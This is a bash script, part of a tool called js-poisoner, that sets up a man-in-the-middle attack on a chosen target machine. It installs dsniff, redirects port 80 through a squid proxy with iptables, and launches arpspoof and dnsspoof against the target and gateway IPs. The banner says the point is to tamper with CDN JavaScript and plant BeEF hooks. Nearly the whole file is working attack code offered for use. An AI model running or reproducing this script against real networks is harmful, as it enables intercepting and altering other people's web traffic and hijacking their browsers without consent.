#!/bin/bash
#
# part of js-poisoner
# license: The Unlicense

banner() {
echo '===================================================='
echo '||                                                ||'
echo '||                  js-poisoner                   ||'
echo '||                                                ||'
echo '||        Tampering with CDNs over the wire       ||'
echo '||                                                ||'
echo '||      >>>---=[ BeEF hooks go here ]=---<<<      ||'
echo '||                                                ||'
echo '===================================================='
}

# func requires args: username
chk_usr() {
        if [ "$(whoami)" != "$1" ]; then
                echo "[!] you need to be root, exiting..."
                exit
        fi
}

chk_tubes() {
        echo "[*] Checking your tubes..."
        if ! ping -c 1 google.com > /dev/null 2>&1  ; then
                if ! ping -c 1 yahoo.com > /dev/null 2>&1  ; then
                        if ! ping -c 1 bing.com > /dev/null 2>&1 ; then
                                echo "[!] Do you have an internet connection?, exiting..."
                                exit 1
                        fi
                fi
        fi
        echo "[+] tubes working..."
}

# func requires argument
get_aptpkg() {

        tpkg=$(dpkg -s $1 | grep "install ok install")
        if [ -z "$tpkg" ]; then

                echo "[*] Checking if PPA that patches no output issue with Ubuntu 14.04 LTS avaliable"
                add-apt-repository http://ppa.launchpad.net/evarlast/dsniff/ubuntu
                apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A65E2E5D742A38EE

                if [ -z $aptup ]; then
                        # rm -rf /var/lib/apt/lists/*
                        apt-get update
                        aptup=1
                fi

                echo "[*] installing $1"
                if ! apt-get -y install $1; then
                echo "[!] APT failed to install "$1", are your repos working? Exiting..."
                exit 1
                fi

        else

                echo "[+] $1 is already installed"
        fi

}

get_iface() {

        echo "[!] Please enter the name of your Interface connected to the LAN."
        while true; do
                read -e IFACE
                echo "You have entered :[ $IFACE ]              "
                echo "If this is correct, select 1 to continue. "
                echo "WARNING:                                  "
                echo "If your selection is other than 1 you     "
                echo "will have to re-enter the interface again "
                echo " [1] Continue                             "
                echo " [2] re-enter name of Interface           "
                echo "                                          "
                read -e chk
                case $chk in
                        [1] ) printf "\ncontinuing\n"; break;;
                        [2] ) printf "\nenter interface name again\n";;
                         *  ) printf "\n\nYou entered something else than 1\n" ;;
                esac
        done

}

get_target_ip() {

        echo "[!] Please enter the IP you wish to target for traffic manipulation."
        while true; do
                read -e TIP
                echo "You have entered :[ $TIP ]               "
                echo "If this is correct, select 1 to continue."
                echo "WARNING:                                 "
                echo "If your selection is other than 1 you    "
                echo "will have to re-enter the IP address     "
                echo " [1] Continue                            "
                echo " [2] re-enter IP                         "
                echo "                                         "
                read -e chk
                case $chk in
                        [1] ) printf "\ncontinuing\n"; break;;
                        [2] ) printf "\nenter IP again\n";;
                         *  ) printf "\n\nYou entered something else than 1\n" ;;
                esac
        done

}

get_gateway_ip() {

        echo "[!] Please enter the Gatway IP of the network you are connected to."
        while true; do
                read -e GIP
                echo "You have entered :[ $GIP ]               "
                echo "If this is correct, select 1 to continue."
                echo "WARNING:                                 "
                echo "If your selection is other than 1 you    "
                echo "will have to re-enter the IP address     "
                echo " [1] Continue                            "
                echo " [2] re-enter IP                         "
                echo "                                         "
                read -e chk
                case $chk in
                        [1] ) printf "\ncontinuing\n"; break;;
                        [2] ) printf "\nenter IP again\n";;
                         *  ) printf "\n\nYou entered something else than 1\n" ;;
                esac
        done

}

clear
banner
chk_usr root
chk_tubes

clear
banner
chk_usr root
chk_tubes

if [ ! -f /etc/squid3/squid.conf ]; then
        echo "[!] squid3 proxy not detected, have you run the installer?"
        echo "[!] Cannot continue, exiting...                           "
        exit 1

        # REMOVE The following else if statments if your web server is on another box...
        
        elif [ ! -f /etc/lighttpd/lighttpd.conf ]; then
                echo "[!] lighttpd not detected, have you run the installer?"
                echo "[!] Cannot continue, exiting...                           "
                exit 1

        elif [ ! -d /var/www ]; then
                echo "[!] web root www not detected, have you run the installer?"
                echo "[!] Cannot continue, exiting...                           "
                exit 1
                
        #######################################################################

fi

echo "[*] Installing dsniff if not detected."
get_aptpkg 'dsniff'

echo "[!] Setting up iptables port forwarding and port 80 redirection to squid's 8080"
get_iface

iptables -F
iptables -X
iptables -t nat -X
iptables -t nat -F
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $IFACE -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

echo "[!] Initiating mitm attack against specified IP address.."
get_target_ip
get_gateway_ip

cat > ./screen-conf << EOF
screen ./arp.sh   # Open first screen and launch first script
split             #  Make second split
focus             #  Switch to second split
screen ./dns.sh   # Open second screen and launch second script
focus
EOF

# tricky, had to escape variables that only apply to arp.sh
cat > ./arp.sh << EOF
#!/bin/bash

clean() {
        ARP=\$(pidof -x "arp.sh")
        DNS=\$(pidof -x "dns.sh")
        rm -f arp.sh dns.sh screen-conf
        kill -9 \$DNS
        kill -9 \$ARP
        exit
}

trap clean INT TERM
arpspoof -i $IFACE -t $TIP $GIP
exit
EOF

cat > ./dns.sh <<EOF
#!/bin/bash
dnsspoof -i $IFACE -f hosts
exit
EOF

chmod +x *.sh

cat > ./hosts << EOF
# This file is intentionally blank to insure dns forwarding
EOF

screen -c screen-conf
if [ ! $? -eq 0 ]; then
        trap 'kill $(jobs -pr)' SIGINT SIGTERM EXIT
fi

exit
